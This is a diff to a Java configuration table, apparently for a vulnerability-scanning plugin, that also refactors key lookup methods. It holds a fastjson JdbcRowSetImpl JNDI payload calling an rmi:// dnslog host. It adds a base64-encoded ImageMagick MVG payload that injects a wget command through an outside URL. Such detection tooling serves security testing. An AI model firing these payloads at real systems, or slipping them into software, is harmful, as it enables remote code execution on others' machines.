@@ -52,6 +52,7 @@ public class ConfigTableModel extends AbstractTableModel{
 
 		configEntries.add(new ConfigEntry("fastjson", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%host.fastjson.test.dnslog.com/evil\",\"autoCommit\":true}",ConfigEntry.Config_Custom_Payload,true));
 		
+		configEntries.add(new ConfigEntry("Imagemagick","cHVzaCBncmFwaGljLWNvbnRleHQNCnZpZXdib3ggMCAwIDY0MCA0ODANCmltYWdlIG92ZXIgMCwwIDAsMCAnaHR0cHM6Ly9pbWFnZW1hZ2ljLmJpdC4weTAubGluay94LnBocD94PWB3Z2V0IC1PLSAlcyA+IC9kZXYvbnVsbGAnDQpwb3AgZ3JhcGhpYy1jb250ZXh0",ConfigEntry.Config_Custom_Payload_Base64,true));
 
 	}
 
@@ -78,10 +79,19 @@ public class ConfigTableModel extends AbstractTableModel{
 	}
 
 
-	public String getConfigByKey(String key) {
+	public String getConfigValueByKey(String key) {
 		for (ConfigEntry entry:configEntries) {
 			if (entry.getKey().equals(key) && entry.isEnable()) {
 				return entry.getValue();
+			}
+		}
+		return null;
+	}
+	
+	public String getConfigTypeByKey(String key) {
+		for (ConfigEntry entry:configEntries) {
+			if (entry.getKey().equals(key) && entry.isEnable()) {
+				return entry.getType();
 			}
 		}
 		return null;
